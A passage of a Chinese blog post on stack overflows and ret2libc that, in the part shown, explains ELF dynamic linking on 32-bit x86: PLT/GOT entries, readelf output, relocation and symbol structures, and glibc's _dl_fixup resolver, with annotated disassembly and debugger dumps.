<!-- build time: Wed Sep 10 2025 16:38:05 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"><meta name="renderer" content="webkit"><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><meta name="google-site-verification" content="ZTJV7LmnjnAU0rDyvzCr7TRRA440DNEQPOSHt9OiYLE"><link rel="alternate" href="/rss.xml" title="symlpigeon's little gensokyo" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="symlpigeon's little gensokyo" type="application/atom+xml"><link rel="alternate" type="application/json" title="symlpigeon's little gensokyo" href="http://symlpigeon.github.io/feed.json"><link rel="preconnect" href="https://s4.zstatic.net"><link rel="preconnect" href="https://at.alicdn.com"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CFredericka%20the%20Great:400,400italic,700,700italic%7CNoto%20Serif%20JP:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CInconsolata:400,400italic,700,700italic&display=swap&subset=latin,latin-ext" media="none" onload="this.media&#x3D;&#39;all&#39;"><link rel="stylesheet" href="/css/app.css?v=0.4.25"><link rel="modulepreload" href="/js/chunk-4ZVORXXI.js"><link rel="modulepreload" href="/js/chunk-QTIRA53W.js"><link rel="modulepreload" href="/js/copy-tex-SCXHUQKS.js"><link rel="modulepreload" href="/js/post-XSNAZ6TV.js"><link rel="modulepreload" href="/js/quicklink-P2UCCMRY.js"><link rel="modulepreload" href="/js/siteInit.js"><link rel="preload" href="/assets/index-bg.jpg" as="image" fetchpriority="high"><meta name="keywords" content="栈溢出"><meta name="description" content="比基本的栈溢出稍微高级一些的利用方式。ret2libc。顺带着学了一下重定位的具体信息。"><link rel="canonical" href="http://symlpigeon.github.io/2022/03/30/stackoverflow-ret2libc/"><script src="https://cdn.jsdelivr.net/npm/echarts@5.4.0/dist/echarts.min.js"></script><style type="text/css">#categories-chart,#categories-radar,#posts-calendar,#posts-chart,#tags-chart{width:100%;height:300px;margin:.5rem auto;padding:.5rem;overflow-x:auto}</style><title>栈溢出，ret2libc</title><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">栈溢出，ret2libc</h1><div class="meta"><span class="item" title="创建时间：2022-03-30 13:07:21"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2022-03-30T13:07:21+08:00">2022-03-30</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>16k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>14 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Another Gensokyo</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><img src="/assets/index-bg.jpg" loading="eager" decoding="async" fetchpriority="high" alt="symlpigeon's little gensokyo"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemlistelement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="item" rel="index" title="分类于二进制"><span itemprop="name">二进制<meta itemprop="position" content="0"></span></a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/Pwn/" itemprop="item" rel="index" title="分类于Pwn"><span itemprop="name">Pwn<meta itemprop="position" content="1"></span></a></span></div><article class="post block" itemscope itemtype="http://schema.org/Article" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://symlpigeon.github.io/2022/03/30/stackoverflow-ret2libc/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.png"><meta itemprop="name" content="神隐陌路/symlPigeon"><meta itemprop="description" content="神隐陌路的个人小站, 夢違え、幻の朝靄の世界の記憶を"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="symlpigeon's little gensokyo"></span><div class="body md" itemprop="articleBody"><h1 id="plt和got表"><a class="anchor" href="#plt和got表">#</a> PLT 和 GOT 表</h1><p>之前在调试的程序里经常会看到这样子的东西：</p><pre><code class="language-x86asm">call   8049050 &lt;gets@plt&gt;
</code></pre><p>在调用对应的函数的时候并不是直接跳转到目标函数的地址，而是经过了一个 <code>.plt</code> 段。这个 <code>plt</code> 也就是<strong> procedure linkage table</strong>。这里就细说一下具体的东西。</p><p>我们写一个这样子的程序并编译：</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Goodbye\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>查看反编译之后的 <code>main</code> 函数：</p><pre><code class="language-x86asm"> 8049193:       8d 83 08 e0 ff ff       lea    eax,[ebx-0x1ff8]
 8049199:       50                      push   eax
 804919a:       e8 b1 fe ff ff          call   8049050 &lt;puts@plt&gt;
 804919f:       83 c4 10                add    esp,0x10
 80491a2:       83 ec 0c                sub    esp,0xc
 80491a5:       8d 83 0f e0 ff ff       lea    eax,[ebx-0x1ff1]
 80491ab:       50                      push   eax
 80491ac:       e8 9f fe ff ff          call   8049050 &lt;puts@plt&gt;
</code></pre><p>可以看到这里调用的是函数 <code>puts@plt</code> 而不是 <code>puts</code> 。我们继续反编译 <code>puts@plt</code> ，发现这是在 <code>.plt</code> 段里:</p><pre><code class="language-x86asm">08049050 &lt;puts@plt&gt;:
 8049050:       ff 25 10 c0 04 08       jmp    DWORD PTR ds:0x804c010
 8049056:       68 08 00 00 00          push   0x8
 804905b:       e9 d0 ff ff ff          jmp    8049030 &lt;_init+0x30&gt;
</code></pre><p>这里程序首先跳转到了 <code>ds:0x804c010</code> 这个地方，这是哪里？</p><p>我们通过 gdb 跟进调试。</p><p><img loading="lazy" data-src="gdb1.jpg" alt=""></p><p>我们查看内存对应区块的内容：</p><pre><code>pwndbg&gt; x 0x804c010
0x804c010 &lt;puts@got.plt&gt;:       0x08049056
</code></pre><p>也就是说这条 <code>jmp DWORD PTR ds:0x804c010</code> 指令跳转到的地方实际上就是它的下一条语句。这里的 GOT 全程是<strong> Global Offset Table</strong>。我们接着往后看。</p><p>程序在 <code>push 8</code> 之后执行了 <code>jmp 0x8049030</code> 。在 objdump 中，跳转的目的地址是这样的：</p><pre><code>08049030 &lt;__libc_start_main@plt-0x10&gt;:
 8049030:       ff 35 04 c0 04 08       push   DWORD PTR ds:0x804c004
 8049036:       ff 25 08 c0 04 08       jmp    DWORD PTR ds:0x804c008
 804903c:       00 00                   add    BYTE PTR [eax],al
</code></pre><p>程序首先将 <code>DWORD PTR ds:0x804c004</code> 地址的数据压入栈中。</p><pre><code>pwndbg&gt; x 0x804c004
0x804c004:      0xf7ffda20
</code></pre><p>接下来，程序跳转进入 <code>_dl_runtime_resolve</code> 中。实际上，这个函数是动态重定位中的关键函数。这个函数的位置在 <code>glibc/sysdep/&lt;machine type&gt;/dl-trampoline.S</code> 中。删去一些代码以便理解。</p><pre><code class="language-asm">_dl_runtime_resolve:
	pushl %eax		# Preserve registers otherwise clobbered.
	pushl %ecx
	pushl %edx
	movl 16(%esp), %edx	# Copy args pushed by PLT in register.  Note
	movl 12(%esp), %eax	# that fixup takes its parameters in regs.
	call _dl_fixup		# Call resolver.
	popl %edx		# Get register content back.
	movl (%esp), %ecx
	movl %eax, (%esp)	# Store the function address.
	movl 4(%esp), %eax
	ret $12			# Jump to function address.
</code></pre><p>这个函数首先将寄存器压栈以保存寄存器的值。接下来，函数从栈上读取数据放入寄存器中。</p><p>执行到语句 <code>movl 16(%esp), %edx</code> 之前，栈中的状态是这样的：</p><pre><code>00:0000│ esp 0xffffd528 —▸ 0xffffd590 —▸ 0xf7f6ee3c (_GLOBAL_OFFSET_TABLE_) ◂— 0x224d6c /* 'lM&quot;' */ =&gt; EDX
01:0004│     0xffffd52c —▸ 0xffffd570 ◂— 0x1 =&gt; ECX
02:0008│     0xffffd530 —▸ 0x804a008 ◂— 'Hello.' =&gt; EAX
03:000c│     0xffffd534 —▸ 0xf7ffda20 ◂— 0x0 =&gt; move into EAX
04:0010│     0xffffd538 ◂— 0x8 =&gt; move into EDX
</code></pre><p>接下来程序进入了 <code>_dl_fixup</code> 函数。这个函数定义在 <code>glibc/elf/dl-runtime.c</code> 中。</p><blockquote><p>/* This function is called through a special trampoline from the PLT the<br>first time each PLT entry is called. We must perform the relocation<br>specified in the PLT of the given shared object, and return the resolved<br>function address to the trampoline, which will restart the original call<br>to that address. Future calls will bounce directly from the PLT to the<br>function. */</p></blockquote><p>函数的定义是这样的：</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>DL_FIXUP_VALUE_TYPE attribute_hidden <span class="token function">__attribute</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noinline<span class="token punctuation">)</span><span class="token punctuation">)</span> ARCH_FIXUP_ATTRIBUTE</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">_dl_fixup</span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="3"></td><td><pre>	   <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l<span class="token punctuation">,</span> </pre></td></tr><tr><td data-num="4"></td><td><pre>       <span class="token function">ElfW</span><span class="token punctuation">(</span>Word<span class="token punctuation">)</span> reloc_arg</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>这里需要加上<strong>一些</strong>额外的<a href="/2022/02/10/re-review2/">信息</a>，一个程序具体的动态链接细节是保存在了 <code>.dynamic</code> 节中。我们可以通过 <code>readelf</code> 读取文件中 <code>dynamic</code> 节的信息：</p><pre><code>$ readelf -d test

Dynamic section at offset 0x2f0c contains 24 entries:
  标记        类型                         名称/值
 0x00000001 (NEEDED)                     共享库：[libc.so.6]
 0x0000000c (INIT)                       0x8049000
 0x0000000d (FINI)                       0x80491c4
 0x00000019 (INIT_ARRAY)                 0x804bf04
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x804bf08
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x8048240
 0x00000005 (STRTAB)                     0x80482d0
 0x00000006 (SYMTAB)                     0x8048260
 0x0000000a (STRSZ)                      139 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x804c000
 0x00000002 (PLTRELSZ)                   16 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x80483b4
 0x00000011 (REL)                        0x804839c
 0x00000012 (RELSZ)                      24 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x804836c
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x804835c
 0x00000000 (NULL)                       0x0
</code></pre><p>在 <code>dynamic</code> 节中，存放的是这样的数据结构：</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    Elf32_Sword d_tag<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        Elf32_Word d_val<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        Elf32_Addr d_ptr<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#125;</span> d_un<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span> Elf32_Dyn<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">extern</span> Elf32_Dyn _DYNAMIC<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>其中 <code>d_tags</code> 用来确定 <code>d_un</code> 的类型。它的具体取值可以在 ELF 对应的<a target="_blank" rel="noopener" href="https://refspecs.linuxfoundation.org/elf/elf.pdf">文档</a>里查看到。</p><p>有一些重要的取值：</p><p><code>DT_STRTAB</code> ：对应的 <code>d_un</code> 是 <code>Elf32_Addr</code> 类型，存放了字符串表。</p><p><code>DT_SYMTAB</code> ：对应的 <code>d_un</code> 是 <code>Elf32_Addr</code> 类型，存放了符号表。</p><p><code>DT_RELA</code> 和 <code>DT_REL</code> ：对应的 <code>d_un</code> 是 <code>Elf32_Addr</code> 类型，存放了重定位表。 <code>DT_RELASZ</code> 和 <code>DT_RELSZ</code> 对应的表项里是重定位表的总大小。 <code>DT_RELAENT</code> 和 <code>DT_RELENT</code> 对应的表项中则是重定位表单个项目的大小。（实际上上面 <code>DT_STRTAB</code> 和 <code>DT_SYMTAB</code> 对应的大小也是类似的命名方式）</p><p><code>DT_JMPREL</code> ：存放了需要重定位的函数信息（对应了 <code>.rel.plt</code> 节）。总大小和表项大小的命名和上面类似。</p><p>在重定位表中，存放了这样的数据结构：</p><pre><code>typedef struct &#123;
    Elf32_Addr r_offset;
    Elf32_Word r_info;
&#125; Elf32_Rel;
typedef struct &#123;
    Elf32_Addr r_offset;
    Elf32_Word r_info;
    Elf32_Sword r_addend;
&#125; Elf32_Rela;
</code></pre><p>其中 <code>Elf32_Rel</code> 对应了 <code>DT_REL</code> ， <code>Elf32_Rela</code> 对应了 <code>DT_RELA</code> 。</p><p>我们可以使用 readelf 查看重定位信息：</p><pre><code>$ readelf -r test

重定位节 '.rel.dyn' at offset 0x39c contains 3 entries:
 偏移量     信息    类型              符号值      符号名称
0804bff4  00000206 R_386_GLOB_DAT    00000000   _ITM_deregisterTM[...]
0804bff8  00000406 R_386_GLOB_DAT    00000000   __gmon_start__
0804bffc  00000506 R_386_GLOB_DAT    00000000   _ITM_registerTMCl[...]

重定位节 '.rel.plt' at offset 0x3b4 contains 2 entries:
 偏移量     信息    类型              符号值      符号名称
0804c00c  00000107 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.34
0804c010  00000307 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
</code></pre><p>可以看到在 <code>.rel.plt</code> 中 <code>puts</code> 函数的 <code>r_offset</code> 值为 <code>0804c010</code> 。这个值指到了哪里？回到前面程序，我们可以看到：</p><pre><code class="language-x86asm">08049050 &lt;puts@plt&gt;:
 8049050:       ff 25 10 c0 04 08       jmp    DWORD PTR ds:0x804c010
 8049056:       68 08 00 00 00          push   0x8
 804905b:       e9 d0 ff ff ff          jmp    8049030 &lt;_init+0x30&gt;
</code></pre><p>这个地址就是 <code>puts@plt</code> 第一条指令跳转的目的地址，也就是在 GOT 表中 <code>puts</code> 对应的表项。那么，完成重定位之后， <code>puts</code> 函数的地址就会被写入该偏移的地址。如果下次再需要调用这个函数，就可以直接调用这个地址进行跳转了，不需要再去执行各种解析操作。</p><p>这个 <code>Elf32_Rel</code> 表项在哪里？这个表项在 <code>.rel.plt</code> 这一节中，我们可以通过 <code>Elf32_Dyn</code> 表项去找到。</p><p>而 <code>puts</code> 函数的信息字段是 <code>00000307</code> ，这个值我们可以去和 <code>Elf32_Rel</code> 中 <code>r_info</code> 进行对照。</p><p>对于上面的 <code>ELF32_REL</code> 和 <code>ELF32_RELA</code> ，还有下面三个定义：</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">ELF32_R_SYM</span><span class="token expression"><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">8</span><span class="token punctuation">)</span></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">ELF32_R_TYPE</span><span class="token expression"><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">ELF32_R_INFO</span><span class="token expression"><span class="token punctuation">(</span>s<span class="token punctuation">,</span>t<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span></pre></td></tr></table></figure><p>使用上面的 <code>ELF32_R_SYM</code> 宏计算 <code>ELF32_R_SYM(r_info)</code> 就可以得到对应符号在符号表中的偏移。 <code>ELF32_R_TYPE</code> 则可以计算出对应的类型。</p><p>对于前面的例子， <code>puts</code> 函数的 <code>r_info</code> 为 <code>00000307</code> ，右移 8 位之后得到的值为 <code>3</code> 。我们再去读取符号表，可以看到偏移为 <code>3</code> 的地方就是 <code>puts</code> 函数的符号表。</p><pre><code>$ readelf -s test

Symbol table '.dynsym' contains 7 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.34 (2)
     2: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]
     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.0 (3)
     4: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     5: 00000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]
     6: 0804a004     4 OBJECT  GLOBAL DEFAULT   16 _IO_stdin_used
</code></pre><p>在符号表中，元素对应的类型是这样的：</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    Elf32_Word st_name<span class="token punctuation">;</span> <span class="token comment">// 符号名在符号字符串表中的索引</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    Elf32_Addr st_value<span class="token punctuation">;</span> <span class="token comment">// 符号值（可能是值或者函数地址）</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    Elf32_Word st_size<span class="token punctuation">;</span> <span class="token comment">// 符号的大小（字节数这样的）</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> st_info<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> st_other<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    Elf32_Half st_shndx<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span> Elf32_Sym<span class="token punctuation">;</span></pre></td></tr></table></figure><p>其中 <code>st_size</code> 段是这样的：</p><pre><code>#define ELF32_ST_BIND(i) ((i)&gt;&gt;4)
#define ELF32_ST_TYPE(i) ((i)&amp;0xf)
#define ELF32_ST_INFO(b,t) (((b)&lt;&lt;4)+((t)&amp;0xf))
</code></pre><p>对于导入符号，这个字段的值是 0x12。</p><blockquote><p>休息一会，放松一下。</p></blockquote><p>好了，有了上面的基础，接下来继续看 <code>test</code> 程序。程序的运行进入了函数 <code>_dl_fixup</code> 中。</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">_dl_fixup</span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="2"></td><td><pre>	   <span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l<span class="token punctuation">,</span> </pre></td></tr><tr><td data-num="3"></td><td><pre>       <span class="token function">ElfW</span><span class="token punctuation">(</span>Word<span class="token punctuation">)</span> reloc_arg</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>和栈顶的元素对照一下：</p><pre><code>00:0000│ esp 0xffffd528 —▸ 0xffffd590 —▸ 0xf7f6ee3c (_GLOBAL_OFFSET_TABLE_) ◂— 0x224d6c /* 'lM&quot;' */
01:0004│     0xffffd52c —▸ 0xffffd570 ◂— 0x1
</code></pre><p>其中 <code>struct link_map *l</code> 对应的是栈顶的元素， <code>ElfW(Word) reloc_arg</code> 对应的是栈顶的下一个元素也就是 1。</p><p>接下来，程序执行</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Sym<span class="token punctuation">)</span> <span class="token operator">*</span><span class="token keyword">const</span> symtab <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_SYMTAB<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>strtab <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_STRTAB<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>前一条语句从 <code>l</code> 中获得了符号表的地址，第二条语句得到了字符串表的位置。</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 获取函数的重定位表地址，注意是 DT_JMPREL，也就是在.rel.plt 节中。</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">//reloc_offset 是 1，记得前面 readelf -r test 得到的结果？puts 在.rel.plt 的第二个，也就是偏移是 1！</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">const</span> PLTREL <span class="token operator">*</span><span class="token keyword">const</span> reloc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_JMPREL<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> reloc_offset<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">// 获取符号表的地址</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Sym<span class="token punctuation">)</span> <span class="token operator">*</span>sym <span class="token operator">=</span> <span class="token operator">&amp;</span>symtab<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Sym<span class="token punctuation">)</span> <span class="token operator">*</span>refsym <span class="token operator">=</span> sym<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">// 得到函数的重定位地址，也就是 GOT 表项的地址</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">void</span> <span class="token operator">*</span><span class="token keyword">const</span> rel_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>l<span class="token operator">-></span>l_addr <span class="token operator">+</span> reloc<span class="token operator">-></span>r_offset<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>接下来是一些定义和检查：</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token class-name">lookup_t</span> result<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  DL_FIXUP_VALUE_TYPE value<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token comment">/* Sanity check that we're really looking at a PLT relocation.  */</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_TYPE<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span> <span class="token operator">==</span> ELF_MACHINE_JMP_SLOT<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>后面是符号表的查找过程：</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span><span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span><span class="token punctuation">(</span>sym<span class="token operator">-></span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">r_found_version</span> <span class="token operator">*</span>version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token comment">// 这一段暂时不用管</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span><span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">const</span> 